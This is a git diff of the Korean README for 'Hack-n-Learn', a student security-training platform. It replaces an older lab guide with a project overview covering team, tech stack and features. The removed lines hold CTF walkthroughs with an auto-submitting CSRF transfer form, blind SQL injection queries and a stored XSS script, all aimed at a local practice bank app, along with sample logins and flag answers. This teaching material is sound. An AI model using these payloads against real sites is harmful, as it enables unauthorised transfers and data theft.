@@ -1,282 +1,391 @@
-# 🏦 HallymBank — Flask 기반 보안 실습 웹 애플리케이션
+<p align="center">
+  <img src="https://img.shields.io/badge/Team-몽땅따-blue?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Project-Hack--n--Learn-blue?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Status-Active-success?style=for-the-badge"/>
+</p>
 
-> **교육용 실습 전용 프로젝트입니다.**  
-> 절대 실제 서비스 환경에 절대 배포하거나 인터넷에 노출하지 마세요.  
-
+# 🌐 Hack-n-Learn: 인터랙티브 보안 실습 플랫폼
+> **“입문자도 짧은 시간 안에 웹 취약점을 배우고, 직접 공격해볼 수 있는 AI기반 보안 교육 플랫폼”**
 ---
+<br><br><br>
 
->python 3.13.xx 버전에서는 실행이 안됩니다. 3.11.x 버전으로 설치해주세요!
+메인페이지 그림 띄우기
 
-## 🚀 실행 방법
+# 📑 0. 목차 (Table of Contents)
 
-### 🧭 프로젝트 내려받기
-원하는 폴더로 이동
-```
-cd C:\Users\내이름\Desktop\Hallymbank
-```
-
-GitHub에서 프로젝트 클론
-```
-git clone https://github.com/mongttangtta/Hack-n-Learn.git
-```
-
-프로젝트 폴더로 이동
-```
-cd Hack-n-Learn
-```
-
-브랜치 변경
-```
-git fetch origin
-git checkout Secure
-```
-
-폴더 구조가 아래처럼 보이면 정상
-```
-HallymBank/
-├── SQLinjection/
-│   ├── app.py
-│   ├── init_db.py
-│   ├── requirements.txt
-│   ├── templates/
-│   └── static/
-├── XSS/
-│   ├── app.py
-│   ├── init_db.py
-│   ├── requirements.txt
-│   ├── templates/
-│   └── static/
-├── CSRF/
-│   ├── app.py
-│   ├── init_db.py
-│   ├── requirements.txt
-│   ├── templates/
-│   └── static/
-└── README.md
-```
-### 가상환경(venv) 만들기
-Python 3.11.X 버전이 설치되어 있는지 확인 (예: Python 3.11.5 가 나오면 OK)
-```
-python --version
-```
-
-가상환경 생성
-```
-python -m venv venv
-```
-
-가상환경 활성화
-```
-venv\Scripts\activate
-```
-
-실행 후 프롬프트에 (venv) 표시가 보이면 성공
-```
-(venv) C:\Users\내이름\Desktop\HallymBank>
-```
-
-### 📦 의존성(Flask 등) 설치
-
-프로젝트 폴더 안에는 requirements.txt 파일이 있음. 설치가 끝나면 “Successfully installed Flask…” 같은 메시지가 나와야 함.
-```
-pip install -r requirements.txt
-```
-
-
-### 🗄️ 데이터베이스 초기화
-
-Flask 앱은 SQLite DB 파일(vuln_bank.db)을 사용하므로, 최초 실행 전 한 번 DB를 생성해줘야 함.
-```
-python init_db.py
-```
-
-정상이라면 아래 메시지가 표시됨:
-```
-DB initialized: vuln_bank.db
-FLAG stored in flags table (NOT in posts).
-```
-
-→ 이제 같은 폴더에 vuln_bank.db 파일이 생긴 것을 확인.
-
-### 🚀 Flask 서버 실행
-```
-python app.py
-```
-
-다음 메시지가 뜨면 성공:
-```
- * Running on http://127.0.0.1:5000 (Press CTRL+C to quit)
-```
-### 🌐 브라우저로 접속
-
-크롬 또는 엣지에서 아래 주소 입력:
-```
-http://127.0.0.1:5000
-```
-
-✅ 첫 화면: 공지사항 + 자유게시판이 보이면 정상 작동!
+- [🌐 Hack-n-Learn: 인터랙티브 보안 실습 플랫폼](#-hack-n-learn-인터랙티브-보안-실습-플랫폼)
+- [📚 1. 프로젝트 개요](#-1-프로젝트-개요)
+  - [👥 1-1. 팀원 구성 및 소개](#-1-1-팀원-구성-및-소개)
+  - [🚀 1-2. 서비스 소개](#-1-2-서비스-소개)
+  - [🎯 1-3. 개발 배경 및 목표](#-1-3-개발-배경-및-목표)
+  - [🗓️ 1-4. 개발 일정(WBS)](#️-1-4-개발-일정wbs)
+- [🏛️ 2. 시스템 구조](#️-2-시스템-구조)
+  - [🧰 2-1. 기술 스택](#-2-1-기술-스택)
+  - [🧱 2-2. 세부 아키텍처 다이어그램](#-2-2-세부-아키텍처-다이어그램)
+  - [📁 2-3. 디렉터리 구조 (Tree)](#-2-3-디렉터리-구조-tree)
+  - [🖥️ 2-4. 서비스 구조](#️-2-4-서비스-구조)
+  - [🗄️ 2-5. 데이터베이스 ERD](#️-2-5-데이터베이스-erd)
+- [🔍 3. 주요 기능](#-3-주요-기능)
+  - [📘 3-1. 서비스 기능](#-3-1-서비스)
+  - [🤖 3-2. AI 챗봇 / AI 해설](#-3-2-ai-챗봇--ai-해설)
+  - [🏆 3-3. 게임화 요소 (Gamification)](#-3-3-게임화-요소-gamification)
 
 
 ---
-## ⚙️ 1. 작동 원리
+# 📚 1. 프로젝트 개요
 
-이 프로젝트는 Flask 기반의 간단한 “은행 시뮬레이션 웹사이트”로,
-**회원 로그인, 게시판, 송금, 공지사항 검색 기능, 글쓰기 기능**을 제공합니다.
+## 👥 1-1. 팀원 구성 및 소개
 
-보안 교육을 위해 일부 구문은 **의도적으로 취약하게 작성**되어 있습니다.  
+### 🔧 역할 분담 (Front / Back / Security)
+<table>
+  <tr>
+    <th style="text-align:center;">Frontend</th>
+    <th style="text-align:center;">Backend</th>
+    <th style="text-align:center;">Security</th>
+  </tr>
+  <tr>
+    <td style="text-align:center;"><b>이준수 (PM)</b></td>
+    <td style="text-align:center;"><b>최준호</b></td>
+    <td style="text-align:center;"><b>장우혁</b></td>
+  </tr>
+  <tr>
+    <td style="text-align:center;">프론트엔드 개발 / 퍼블리싱</td>
+    <td style="text-align:center;">백엔드 개발 / API 설계</td>
+    <td style="text-align:center;">취약점 실습 환경 제작</td>
+  </tr>
+  <tr>
+    <td style="text-align:center;">UI/UX 구성 / 기능 구현</td>
+    <td style="text-align:center;">DB 설계 / 서버 운영</td>
+    <td style="text-align:center;">공격·방어 로직 구현, 문제 기획, 문서화</td>
+  </tr>
+</table>
 
-### 취약한 부분
-**SQL injection**
-`/board/notice` 내 검색 기능에서 SQL구문으로 SQLinjcetion 취약점 발생.
-**XSS**
-`/board/free` 내 글쓰기 기능에서 script를 작성하면 XSS 취약점 발생.
-**CSRF**
-송금부분에서 사용자 몰래 송금이 되게끔 공격 html을 작성하면 CSRF 취약점 발생.
-
----
-
-## 🧩 2. 기능 설명
-
-| 기능 | 경로 | 설명 |
-|------|------|------|
-| 홈 | `/` | 공지사항과 자유게시판의 최신 글 목록 표시 |
-| 로그인/로그아웃 | `/login`, `/logout` | 사용자 인증 (admin / alice / bob 샘플 계정) |
-| 게시판 | `/board/<board>` | 공지사항(notice), 자유게시판(free) — 글 목록 및 검색 가능 |
-| 글쓰기 | `/write` | 로그인 후 글 작성 가능 (admin만 공지 작성 가능) |
-| 글삭제 | `/delete/<id>` | 작성자 또는 admin만 삭제 가능 (CSRF 토큰 검증) |
-| 계좌정보 | `/account` | 현재 로그인한 사용자의 계좌 정보 조회 |
-| 송금 | `/transfer` | 다른 사용자에게 금액 송금 (CSRF 토큰 검증) |
-| DB 초기화 | `python init_db.py` | DB를 삭제하고 다시 생성 (FLAG 포함) |
-
-
----
-
-## 🔍 각 취약점 정답(풀이) 보기
-
-> ⚠️ 이 아래 내용은 **풀이과정** 입니다.  
+## 📌 Project Documents
+- **Notion :** [프로젝트 노션 링크](https://www.notion.so/2025-2-24e2f42bf16780e099c3e697969527cf)
+- **Figma :** [프로젝트 피그마 링크](https://www.figma.com/design/WBl5nQpFn6xTuTadciknmj/Hack--n--Learn?node-id=354-51&t=f7VBh3QUKE77eR4L-1)
 
 ---
 
-<details>
-  <summary><strong>🧊 CSRF – 송금 CSRF & Base64 FLAG</strong></summary>
+## 🚀 1-2. 서비스 소개
 
-### 1) 실습 환경 실행
+### 🔑 핵심 가치
+- 입문자도 쉽게 배우는 웹 취약점 교육
+- 모든 실습이 **100% 로컬에서 안전하게 실행 가능**
+- 공격 → 로그 분석 → AI 해설까지 한 번에 제공
+- 기존 Wargame보다 높은 접근성
 
-```bash
-cd CSRF
-python init_db.py      # DB 초기화 (사용자, 게시글, FLAG(Base64) 세팅)
-python app.py          # 서버 실행
+### 🆚 차별점
+- AI 기반 문제 해설 및 챗봇
+- 현실적인 시나리오로 사용자의 몰입도 상승
+- 실제 코드로 보는 취약점 실습
+- 실습 서버 직접 구동
+- 실시간 보안뉴스 제공
+
+---
+
+## 🎯 1-3. 개발 배경 및 목표
+
+### ❗ 기존 Wargame의 한계
+- 영문 기반
+- 난이도 높음
+- 로컬 실습 기반 부족
+- 코드 단위 학습 어려움
+- 상대적으로 부족한 방어기법
+
+### 🔧 개선 방향
+- Flask/PHP 로컬 서버 기반 실습 제공
+- 단순 정답 확인이 아닌 **AI 해설 중심 구조**
+- 취약점 학습의 입문 장벽 낮추기
+- 각종 툴 없이도 공격 가능한 실습 제공
+
+### 🎯 목표
+- **웹 취약점 학습의 Full Stack Loop 제공**  
+  (이론학습 → 실습을 통한 공격 → 방어기법 학습 → 퀴즈 → AI해설 → 복습)
+- Security Mindset 습득
+- 누구나 빠르게 취약점 이해 가능
+
+---
+
+## 🗓️ 1-4. 개발 일정(WBS)
+<img width="1815" height="1029" alt="image" src="https://github.com/user-attachments/assets/710cf6ae-fec5-4fb3-a865-b97511003e6a" />
+
+### 전체 타임라인 (9월~12월)
+- **09월:** 기획·구조 설계
+- **10월:** 이론학습·실습 환경 구축
+- **11월:** 실전문제·커뮤니티 UI 구현
+- **12월:** AI 통합 및 최종 발표
+
+---
+
+# 🏛️ 2. 시스템 구조
+
+# 🧰 Tech Stack
+
+## 🎨 Frontend
+
+### 🎛 UI / Styling
+<p align="left">
+  <img src="https://img.shields.io/badge/TailwindCSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white"/>
+  <img src="https://img.shields.io/badge/TailwindCSS/Typography-06B6D4?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/tw--animate--css-000000?style=for-the-badge"/>
+</p>
+
+> 반응형 UI, 컴포넌트 스타일링, Typography, 애니메이션 구성
+
+---
+
+### 🧩 프론트엔드 로직 / 상태 관리
+<p align="left">
+  <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB"/>
+  <img src="https://img.shields.io/badge/Zustand-4D3832?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/React--Router--DOM-CA4245?style=for-the-badge&logo=reactrouter&logoColor=white"/>
+  <img src="https://img.shields.io/badge/React--Hook--Form-EC5990?style=for-the-badge&logo=reacthookform&logoColor=white"/>
+</p>
+
+> SPA 라우팅, 글로벌 상태 관리, 폼 검증 & UI 상태 관리
+
+---
+
+### 📡 통신 / 유틸리티
+<p align="left">
+  <img src="https://img.shields.io/badge/Axios-5A29E4?style=for-the-badge&logo=axios&logoColor=white"/>
+  <img src="https://img.shields.io/badge/clsx-000000?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/class--variance--authority-000000?style=for-the-badge"/>
+</p>
+
+> API 통신, 조건부 클래스 처리 유틸리티
+
+---
+
+### 🛠 개발 환경 & 빌드
+<p align="left">
+  <img src="https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white"/>
+  <img src="https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white"/>
+  <img src="https://img.shields.io/badge/ESLint-4B32C3?style=for-the-badge&logo=eslint&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Vite%20React%20Plugin-646CFF?style=for-the-badge"/>
+</p>
+
+> 번들러, 정적 타입, 린팅, 개발 빌드 환경
+
+---
+
+<br>
+
+## 🖥️ Backend
+
+### 🚀 서버 프레임워크
+<p align="left">
+  <img src="https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=node.js&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white"/>
+</p>
+
+> API 서버, 라우팅, 미들웨어 구성
+
+---
+
+### 🔐 인증 / 보안
+<p align="left">
+  <img src="https://img.shields.io/badge/Passport.js-34E27A?style=for-the-badge&logo=passport&logoColor=black"/>
+  <img src="https://img.shields.io/badge/Bcrypt-00599C?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Rate--Limit-black?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/CORS-black?style=for-the-badge"/>
+</p>
+
+> OAuth 로그인(Google/GitHub), 비밀번호 해시, 요청 제한, CORS 정책
+
+---
+
+### 🗄 데이터베이스 / 파일 저장소
+<p align="left">
+  <img src="https://img.shields.io/badge/MongoDB%20Atlas-47A248?style=for-the-badge&logo=mongodb&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Mongoose-880000?style=for-the-badge&logo=mongoose&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Cloudflare%20R2-F38020?style=for-the-badge&logo=cloudflare&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Multer-1A1A1A?style=for-the-badge"/>
+</p>
+
+> 문서형 DB, ODM, S3-호환 스토리지, 파일 업로드
+
+---
+
+### 🤖 AI 연동
+<p align="left">
+  <img src="https://img.shields.io/badge/OpenAI%20SDK-412991?style=for-the-badge&logo=openai&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Axios/Fetch-5A29E4?style=for-the-badge&logo=axios&logoColor=white"/>
+</p>
+
+> GPT 호출, AI 해설/챗봇 연동
+
+---
+
+### 🛠 서버 인프라 / 배포
+<p align="left">
+  <img src="https://img.shields.io/badge/AWS--EC2-FF9900?style=for-the-badge&logo=amazonaws&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Nginx-009639?style=for-the-badge&logo=nginx&logoColor=white"/>
+  <img src="https://img.shields.io/badge/PM2-2B037A?style=for-the-badge&logo=pm2&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Docker%20Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Nodemailer-219C20?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Dotenv-ECD53F?style=for-the-badge"/>
+</p>
+
+> Reverse Proxy, 무중단 배포, 컨테이너 운영, 자동 메일링, 환경 변수 관리
+
+---
+
+<br>
+
+## 🛡️ Security / Labs
+
+### 🧪 취약점 실습 환경
+<p align="left">
+  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white"/>
+  <img src="https://img.shields.io/badge/SQLite-003B57?style=for-the-badge&logo=sqlite&logoColor=white"/>
+  <img src="https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white"/>
+</p>
+
+> 취약한 웹서버 제공, 실습 코드 제작, 플래그 검증 환경
+
+---
+
+### 🔍 보안 연구 / 공격·방어 로직 구현
+<p align="left">
+  <img src="https://img.shields.io/badge/Vulnerable--Labs-Danger?style=for-the-badge&logo=hackaday&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Security%20Research-FF0000?style=for-the-badge&logo=protonmail&logoColor=white"/>
+</p>
+
+> XSS, SQLi, CSRF 등 공격 로직 및 방어 기법 구현
+
+---
+
+## 🧱 2-2. 세부 아키텍처 다이어그램
+
+<img width="1156" height="867" alt="image" src="https://github.com/user-attachments/assets/9a0ddec8-713a-42bb-849f-cfe3c648831c" />
+
+
+---
+
+## 📁 2-3. 디렉터리 구조 (Tree)
+
 ```
-브라우저에서 http://127.0.0.1:5000 접속.
-
-### 2) 피해자 계정으로 로그인
-bob / bob123 로 로그인  
-→ 우측 “현재 로그인: bob” 이 보이면 OK.
-
-### 3) 공격 페이지(attack.html) 작성
-아무 폴더에 attack.html 생성
-
-```html
-<form id="f"
-      action="http://127.0.0.1:5000/transfer"
-      method="POST"
-      target="hidden_iframe">
-        <input type="hidden" name="receiver" value="admin">
-        <input type="hidden" name="amount" value="100">
-</form>
-
-<script>
-      // 페이지가 로드되면 폼 자동 제출 (은밀 실행)
-      window.onload = function(){
-        document.getElementById('f').submit();
-      };
-</script>
+📦 Hack-n-Learn
+┣ 📂 backend
+┃ ┣ 📂 backup
+┃ ┣ 📂 src
+┃ ┃ ┣ 📂 config
+┃ ┃ ┣ 📂 controllers
+┃ ┃ ┣ 📂 cron
+┃ ┃ ┣ 📂 middlewares
+┃ ┃ ┣ 📂 models
+┃ ┃ ┣ 📂 routes
+┃ ┃ ┣ 📂 services
+┃ ┃ ┣ 📂 socket
+┃ ┃ ┣ 📂 utils
+┃ ┃ ┣ 📜 app.js
+┃ ┃ ┗ 📜 server.js
+┃ ┗ 📜 ecosystem.config.js
+┃
+┣ 📂 Secure
+┃ ┣ 📂 CSRF
+┃ ┣ 📂 DT_FileUpload
+┃ ┣ 📂 SQLi
+┃ ┗ 📂 XSS
+┃
+┗ 📄 README.md
 ```
 
-### 4) 공격 페이지 열기
-```bash
-python -m http.server 8000  # attack.html 있는 폴더에서
-```
-그리고 같은 브라우저에서 (이미 bob으로 로그인된 상태)  
-http://127.0.0.1:8000/attack.html 접속  
-크롬 브라우저에서 리디렉션이 차단되어있는 경우, 팝업창을 통해 리디렉션을 허용하고 다시 시도  
-→ 자동으로 /transfer 로 POST 가 날아가고, 서버는 CSRF 공격 성공 처리.
+---
 
-### 5) FLAG(Base64) 확인 & 디코딩
-HallymBank 탭의 결과 페이지에 다음과 같은 메시지가 뜬다.
-```text
-CSRF 공격 성공!
-Base64(RkxBR3tDU1JGX0FUVEFDS19TVUNDRVNTfQ)
-```
+## 🖥️ 2-4. 서비스 구조
+~~각 화면 사진 캡처하기~~
 
-### 6) Base64 디코딩
-1. 구글 검색창에 "Base64 디코딩" 검색
-2. Base64 디코딩 사이트에 공격 성공 코드 복사 후 붙여넣기.
-3. 결과 복사 후 FLAG형식에 맞게 입력
+---
 
-### 정답 : FLAG{CSRF_ATTACK_SUCCESS}  
+## 🗄️ 2-5. 데이터베이스 ERD
+
+아래 ERD는 Hack-n-Learn의 주요 데이터 모델(User, Quiz, Problem, Process, Community 등)의  
+관계 구조를 나타낸 것입니다.
+
+<img width="3316" height="2851" alt="hacknlearn drawio" src="https://github.com/user-attachments/assets/c14f9312-e5bc-461c-ab78-ba83d7db2455" />
 
 
-</details>
-<details>
-  <summary><strong>🧮 SQL Injection – Boolean 기반 Blind SQLi</strong></summary>
+### 메인 화면
 
-### 1) 실습 환경 실행
+### 📘 이론학습
 
-```bash
-cd SQLi
-python init_db.py      # DB 초기화
-python app.py          # 서버 실행
-```
-브라우저에서 http://127.0.0.1:5000 접속.
+> 이론 → 실습 → 퀴즈 → AI 해설
 
-### 2) 아무 계정으로 로그인
-alice / alice123 또는 bob / bob123 로 로그인  
-→ 우측 “현재 로그인: bob” 이 보이면 OK.
+### 🧪 실전문제
+> 실제 서비스 기반 공격 시나리오 → FLAG 찾기 → AI 해설
 
-### 3) 취약한 SQL구문 확인하기
-공지사항의 검색창에 `1=1`(참) 과 `1=2`(거짓) 입력 후 결과 확인  
- → 결과 개수 차이가 나면 Boolean 기반 Blind 가능.
+### 🏛 커뮤니티
+- 보안 뉴스
+- 문의게시판
+- 자료실 업로드/다운로드
 
-### 4) SQL 구문으로 FLAG 추출
+---
 
-```sql
-(SELECT substr(flag,1,1) FROM flags) = 'F'
-(SELECT substr(flag,1,2) FROM flags) = 'FL'
-...
-(SELECT substr(flag,1,18) FROM flags) = 'FLAG{HackAndLearn}'
-```
-1~N 번째 문자에 대해 이분 탐색 or 알파벳 하나씩 대입 → FLAG{...} 문자열이 완성되면 문제 해결.
+# 🔍 3. 주요 기능
 
-### 정답 : FLAG{HackAndLearn}
+## 📘 3-1. 서비스
 
-</details>
-  <details> <summary><strong>💥 XSS – 저장형 XSS & 세션 탈취 체험</strong></summary>
+### ▣ 이론학습
 
-### 1) 실습 환경 실행
-```bash
-cd SQLi
-python init_db.py      # DB 초기화
-python app.py          # 서버 실행
-```
-브라우저에서 http://127.0.0.1:5000 접속.
+#### 다루는 취약점 7개
+- XSS
+- Open Redirect
+- SQL Injection
+- CSRF
+- Directory Traversal
+- Command Injection
+- File Upload
 
-### 2) 아무 계정으로 로그인
-alice / alice123 또는 bob / bob123 로 로그인  
-→ 우측 “현재 로그인: bob” 이 보이면 OK.
+#### 학습 구조
+1. 이론
+2. 실습 코드(Flask)
+3. 퀴즈
+4. AI 해설
 
-### 3) 자유게시판에 script 작성
-글쓰기/댓글 입력에 다음과 같이 입력
+#### 추가 특징
+- 단계별 난이도 상승
+- 실습은 로컬에서 직접 구동 방식
 
-제목 : (상관없음)
-본문 : <script>alert('1');</script>
+---
 
-### 4) 작성한 글 읽기
-alert가 실행되면서 숨겨져있던 flag가 보임
+### ▣ 실전문제
+- XSS → 자유게시판에서 script 실행
+- SQLi → blind SQLi / 공지사항에 숨겨진 flags 테이블에서 flag 추출
+- CSRF → 송금 화면에서 악성코드 실행
+- FileUpload → 프로필 사진 업로드 시 사진 이름을 바꿔 악성코드 실행
 
-### 정답 : FLAG{CAUGHT_YOU_BUDDY}
+#### 포함 기능
+- AI 자동 해설
+- 단계별 문제 구성
 
-</details> 
+---
 
+### ▣ 커뮤니티 기능
+- 보안뉴스 자동 크롤링
+- 문의게시판
+- 자료실
 
+---
 
+## 🤖 3-2. AI 챗봇 / AI 해설
+
+### 제공 기능
+- 챗봇
+    - 자유 대화 방식으로, 쉽게 궁금증 해결 가능
+- 퀴즈 AI 해설
+    - 틀린 문제를 기반으로 왜 틀렸는지 이유 설명
+- 실습 AI 해설
+    - json 로그 기반 자동 분석
+
+---
+
+## 🏆 3-3. 게임화 요소 (Gamification)
+
+- **칭호 시스템**
+- **티어 시스템**
+- **점수 시스템**
+- **랭킹 페이지**
